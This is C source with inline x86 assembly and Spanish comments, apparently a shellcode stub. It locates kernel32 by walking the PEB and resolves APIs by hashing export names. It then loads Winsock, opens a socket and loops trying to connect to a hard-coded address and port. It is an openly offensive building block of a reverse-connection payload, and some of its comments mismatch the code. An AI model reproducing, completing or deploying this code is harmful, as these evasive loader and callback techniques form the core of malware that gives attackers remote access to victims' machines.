#pragma optimize("gsy", on)
#pragma comment(linker, "/NODEFAULTLIB")
#pragma comment(linker, "/ENTRY:main")

#include <Windows.h>
#include "Macros.h"

DWORD GetKernel();
DWORD FindFunction(DWORD BaseAddress,DWORD FunctionHash);
DWORD LoadFunctions(DWORD BaseAddress,DWORD lpHashes,DWORD numHashes);

/*Se declaran las constantes con el formato "_%NombreAPI%" el valor es la posición de la dirección del API en el stack*/
CREATE_IDS(
			/*kernel32*/	(LoadLibraryA) (ExitProcess) (VirtualAlloc) (VirtualFree)
			/*ws2_32*/		(WSASocketA) (connect) (WSAStartup) (closesocket) (send) (inet_addr) (gethostbyname) (recv)
			/*variables*/	(hSocket)
		   )

void __declspec(naked) main(){
	__asm{
		jmp start

IP:		EMIT_BYTE_ARRAY(('1') ('2') ('7') ('.') ('0') ('.') ('0') ('.') ('1')(0))
PORT:	EMIT_DWORD(0xD0070002)
//HASH:	EMIT_BYTE_ARRAY()
		kernel32_symbol_hashes:
		
		#define kernel32_count	4
		/*LoadLibraryA*/		HASH_AND_EMIT(('L') ('o') ('a') ('d') ('L') ('i') ('b') ('r') ('a') ('r') ('y') ('A'))
		/*ExitProcess*/			HASH_AND_EMIT(('E') ('x') ('i') ('t') ('P') ('r') ('o') ('c') ('e') ('s') ('s'))
		/*VirtualAlloc*/		HASH_AND_EMIT(('V') ('i') ('r') ('t') ('u') ('a') ('l') ('A') ('l') ('l') ('o') ('c'))
		/*VirtualFree*/			HASH_AND_EMIT(('V') ('i') ('r') ('t') ('u') ('a') ('l') ('F') ('r') ('e') ('e'))

		ws2_32_symbol_hashes:

		#define ws2_32_count	8
		/*WSASocketA*/			HASH_AND_EMIT(('W') ('S') ('A') ('S') ('o') ('c') ('k') ('e') ('t') ('A'))
		/*connect*/				HASH_AND_EMIT(('c') ('o') ('n') ('n') ('e') ('c') ('t'))
		/*WSAStartup*/			HASH_AND_EMIT(('W') ('S') ('A') ('S') ('t') ('a') ('r') ('t') ('u') ('p'))
		/*closesocket*/			HASH_AND_EMIT(('c') ('l') ('o') ('s') ('e') ('s') ('o') ('c') ('k') ('e') ('t'))
		/*send*/				HASH_AND_EMIT(('s') ('e') ('n') ('d'))
		/*inet_addr*/			HASH_AND_EMIT(('i') ('n') ('e') ('t') ('_') ('a') ('d') ('d') ('r'))
		/*gethostbyname*/		HASH_AND_EMIT(('g') ('e') ('t') ('h') ('o') ('s') ('t') ('b') ('y') ('n') ('a') ('m') ('e'))
		/*recv*/				HASH_AND_EMIT(('r') ('e') ('c') ('v'))

start:
		//Reservamos espacio en la pila para las direcciones de las apis
		sub esp, STACKSIZE 
		//Usamos ebp como puntero al inicio del buffer donde se guardarán las apis
		//para así poder llamarlas en cualquier punto del programa
		mov ebp, esp
		//Obtenemos en eax la dirección de KERNEL32.DLL
		call GetKernel

		//Cargamos las apis de kernel32 en la pila a partir de los hashes
		push kernel32_count				//Numero de hashes
		push kernel32_symbol_hashes		//Puntero al primer hash
		push eax						//Kernel32 BaseAddress
		call LoadFunctions
		//Obtenemos el BaseAddress de ws2_32
		push '23'						//push '32\0\0'
		push '_2sw'						//push "ws2_"
		push esp						//ESP = "ws2_32"
		call [ebp+_LoadLibraryA]		//call LoadLibraryA
		add esp, 0x8					//Restauramos la pila
		add ebp, (kernel32_count*4)		//Desplazamos el buffer para no pisar los punteros a las apis de kernel32
		push ws2_32_count				//Numero de Hashes
		push ws2_32_symbol_hashes		//Puntero al primer hash de ws2_32.dll
		push eax						//ws_32.dll BaseAddress
		call LoadFunctions
		sub ebp, (kernel32_count*4)		//Lo restauramos al inicio del stack de APIs

		//Llamamos a WSAStartup
		sub esp, 0x190					//Reservamos espacio en la pila para WSADATA
		push esp                        //ESP = lpWSADATA
		push 0x202						//VersionRequested (2.2)
		call [ebp+_WSAStartup]			//call WSAStartup
		add esp, 0x190					//Restauramos la pila

NuevoSocket:
		cdq								//EDX = 0	(Si EAX >=0; WSAStartup siempre devuelve >=0)
		push edx						//push 0
		push edx						//push 0
		push edx						//push 0
		push edx						//push 0
		inc  edx						//EDX = 1 (SOCK_STREAM)
		push edx						//push SOCK_STREAM
		inc  edx						//EDX = 2 (AF_INET)
		push edx						//push AF_INET
		call [ebp+_WSASocketA]			//call WSASocketA
		mov [ebp+_hSocket], eax			//hSocket = EAX

		push IP
		call [ebp+_gethostbyname]		//call gethostbyname
		test eax, eax
		je Exit							//Si fallamos al obtener el host mejor salimos...
        add	eax, 0x20					//EAX = hostent.h_name
		push eax
		call [ebp+_inet_addr]			//call inet_addr
		//Construimos la sockaddr_in en la pila
		push eax						//IP
		push [PORT]						//PORT
		mov ebx, esp					//ebx = puntero sockaddr_in
		add esp, 0x8
BucleConectar:
		push 0x10						//Tamaño sockaddr_in 
		push ebx					    //Puntero a sockaddr_in
		push [ebp+_hSocket]				//hSocket
		call [ebp+_connect]				//call connect
		test eax, eax
		jl BucleConectar
Exit:
		ret
	}
}

DWORD __declspec(naked) GetKernel(){
	__asm{
find_kernel32:
		push esi
		push edi
		xor eax, eax
		mov esi, FS:[eax+0x30]			//ESI = &(PEB)
		mov esi, [esi+0x0C]				//ESI = PEB->Ldr
		mov esi, [esi+0x1C]				//ESI = PEB->Ldr.InInitOrder[0]
next_module:
		mov eax, [esi+0x08]				//EAX = PEB->Ldr.InInitOrder[X].base_address
		mov edi, [esi+0x20]				//EDI = PEB->Ldr.InInitOrder[X].module_name (unicode)
		mov esi, [esi]					//ESI = PEB->Ldr.InInitOrder[X].flink == NextModule
		cmp [edi+6*2], '3'				//module_name[6] == '3'?
		je find_kernel32_finished
		jmp next_module
find_kernel32_finished:
		pop	edi
		pop esi
		ret
	}
}

DWORD __declspec(naked) LoadFunctions(DWORD BaseAddress, DWORD lpHashes, DWORD numHashes){
	__asm{
		pushad
		mov ebx, [esp+0x24]				//BaseAddress
		mov esi, [esp+0x28]				//lpHashes
		mov ecx, [esp+0x2C]				//numHashes

		lea edi, [ebp+0x04]				//EDI = lpBuffer
		cdq								//EDX = 0
NextFunction:
		lodsd							//mov eax, [esi]; esi+=4
		push eax						//FunctionHash
		push ebx						//BaseAddress
		call FindFunction
		mov [edi+edx*4], eax			//Guardamos dir en buffer pila

		inc edx							//EDX++
		dec ecx							//ECX++
		jnz NextFunction

		popad
		ret 0xC
	}
}

DWORD __declspec(naked) FindFunction(DWORD BaseAddress,DWORD FunctionHash){
	__asm{
find_function:
		pushad
		mov ebp,[esp+0x24]				//EBP = &IMAGE_DOS_HEADER
		mov eax,[ebp+0x3C]				//EAX = IMAGE_DOS_HEADER.e_lfanew
		mov edx,[ebp+eax+0x78]			//EDX = IMAGE_OPTIONAL_HEADER->DataDirectory(IMAGE_FILE_EXPORT_DIRECTORY).VirtualAddress
		add edx,ebp						//EDX = EAT RVA
		mov ecx,[edx+0x18]				//ECX = IMAGE_EXPORT_DIRECTORY.NumberOfFunctions
		mov ebx,[edx+0x20]				//EBX = IMAGE_EXPORT_DIRECTORY.AddressOfFunctions (RVA)
		add ebx,ebp						//EBX = IMAGE_EXPORT_DIRECTORY.AddressOfFunctions (VA)
find_function_loop:
		jecxz find_function_finished	//Si ECX == 0 ya no quedan funciones por recorrer
		dec ecx							//ECX--
		mov esi,[ebx+ecx*4]				//ESI = IMAGE_EXPORT_DIRECTORY.AddressOfFunctions[X] (RVA)
		add esi,ebp						//ESI = IMAGE_EXPORT_DIRECTORY.AddressOfNames[X] (VA) Export Name Table
compute_hash:
		xor edi,edi						//EDI = 0
		xor eax,eax						//EAX = 0
		cld								//Clear Direction Flag
compute_hash_again:
		lodsb							//AL = BYTE[ESI] //ESI++
		test al,al
		jz compute_hash_finished
		shl edi,0x2
		add edi,eax
		jmp compute_hash_again
compute_hash_finished:
		find_function_compare:
		cmp edi,[esp+0x28]				//Comparamos el Hash con FunctionHash
		jnz find_function_loop
		mov ebx,[edx+0x24]				//EBX = IMAGE_EXPORT_DIRECTORY.AddressOfNames (RVA)
		add ebx,ebp						//EBX = IMAGE_EXPORT_DIRECTORY.AddressOfNames (VA)
		mov cx,[ebx+2*ecx]
		mov ebx,[edx+0x1c]
		add ebx,ebp
		mov eax,[ebx+4*ecx]
		add eax,ebp
		mov [esp+0x1c],eax
find_function_finished:
		popad
		ret 0x8
	}
}